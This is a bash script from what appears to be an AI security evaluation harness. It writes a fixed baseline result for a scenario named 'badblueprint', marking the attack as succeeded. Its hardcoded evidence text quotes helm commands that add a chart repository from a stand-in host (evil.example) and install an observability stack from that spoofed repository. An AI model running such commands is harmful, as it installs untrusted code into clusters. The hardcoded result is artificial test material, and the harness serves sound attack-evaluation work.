#!/usr/bin/env bash

set -euo pipefail

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
output_dir="$repo_root/evaluation/baseline_outputs/badblueprint"
output_path="$output_dir/attack_succeeded.json"

cd "$repo_root"

mkdir -p "$output_dir"

pytest -q evaluation/tests/test_badblueprint_structure.py

commit_sha="unknown"
if command -v git >/dev/null 2>&1; then
  if git rev-parse HEAD >/dev/null 2>&1; then
    commit_sha="$(git rev-parse HEAD)"
  fi
fi

timestamp="1970-01-01T00:00:00Z"

evidence="$(cat <<'EVIDENCE'
[analyst] Observed helm commands indicating malicious repo usage.
helm repo add stable-lookalike https://evil.example/repo
helm repo update
[analyst] Installation command for observability stack.
helm install cluster-observability-stack stable-lookalike/cluster-observability-stack --namespace observability
[analyst] This sequence matches the badblueprint tactic of installing from a spoofed repo.
EVIDENCE
)"

temp_file="$(mktemp "$output_dir/attack_succeeded.json.tmp.XXXXXX")"

SCENARIO_ID="pvnge_badblueprint" \
ATTACK_SUCCEEDED="true" \
EVIDENCE_TEXT="$evidence" \
COMMIT_SHA="$commit_sha" \
TIMESTAMP="$timestamp" \
OUTPUT_PATH="$temp_file" \
python - <<'PY'
import json
import os

payload = {
    "scenario_id": os.environ["SCENARIO_ID"],
    "attack_succeeded": os.environ["ATTACK_SUCCEEDED"] == "true",
    "evidence": os.environ["EVIDENCE_TEXT"],
    "metadata": {
        "commit_sha": os.environ["COMMIT_SHA"],
        "timestamp": os.environ["TIMESTAMP"],
    },
}

with open(os.environ["OUTPUT_PATH"], "w", encoding="utf-8") as handle:
    json.dump(payload, handle, indent=2)
    handle.write("\n")
PY

mv "$temp_file" "$output_path"

echo "[badblueprint] Baseline output written to $output_path"
